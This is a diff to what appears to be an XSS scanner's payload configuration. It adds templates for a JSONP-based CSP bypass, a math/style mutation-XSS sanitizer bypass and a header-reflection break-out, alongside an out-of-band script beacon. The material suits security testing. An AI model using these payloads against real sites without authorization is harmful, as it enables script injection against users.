@@ -34,6 +34,18 @@ payloads:
     template: "<script src=//{oast_host}/{canary}.js></script>"
     confidence: confirmed
     notes: Out-of-band beacon; OAST DNS callback confirms execution.
+  - id: jsonp_csp_bypass
+    template: "<script src=\"https://accounts.google.com/o/oauth2/revoke?callback={canary}\"></script>"
+    confidence: suspected
+    notes: CSP script-src allowlist bypass via a JSONP endpoint on a trusted third-party origin; {canary} becomes the executed callback function name.
+  - id: math_style_mxss
+    template: "<math><style><img src=x onerror=alert({canary})></style></math>"
+    confidence: suspected
+    notes: Mutation-XSS tag-combination bypass (math+style) defeats sanitizers that individually allowlist each tag.
+  - id: header_reflect_break
+    template: "x\"><svg onload=alert({canary})>"
+    confidence: suspected
+    notes: Attribute/HTML break-out for header-reflection sinks (X-Forwarded-Host, Referer, User-Agent echoed into HTML without encoding).
 mutations:
   - name: case_flip
     description: HTML tag/attr names are case-insensitive; flips defeat substring filters.
